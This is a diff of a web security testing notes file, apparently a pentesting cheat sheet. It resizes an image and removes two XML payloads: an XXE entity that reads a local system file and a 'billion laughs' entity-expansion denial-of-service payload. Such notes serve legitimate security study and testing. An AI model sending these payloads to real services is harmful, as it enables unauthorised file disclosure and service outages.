@@ -1,6 +1,6 @@
 ![Alt text](https://github.com/Anvesh464/Web_APP_Test/blob/main/Pilot%20Testing/media/Ashok%20Findings.jpeg?raw=true)
 
-<img src="https://github.com/Anvesh464/Web_APP_Test/blob/main/Pilot%20Testing/media/Ashok%20Findings.jpeg?raw=true" width="400">
+<img src="https://github.com/Anvesh464/Web_APP_Test/blob/main/Pilot%20Testing/media/Ashok%20Findings.jpeg?raw=true" width="600">
 
 # XSS and Web Security Notes
 
@@ -1497,22 +1497,3 @@ Classic XXE - etc passwd
 ```
 
 ### Classic XXE
-```
-<?xml version="1.0"?>
-<!DOCTYPE data [
-<!ELEMENT data (#ANY)>
-<!ENTITY file SYSTEM "file:///sys/power/image_size">
-]>
-<data>&file;</data>
-```
-### Deny Of Service - Billion Laugh Attack
-```
-<!DOCTYPE data [
-<!ENTITY a0 "dos" >
-<!ENTITY a1 "&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;">
-<!ENTITY a2 "&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;">
-<!ENTITY a3 "&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;">
-<!ENTITY a4 "&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;">
-]>
-<data>&a4;</data>
-```
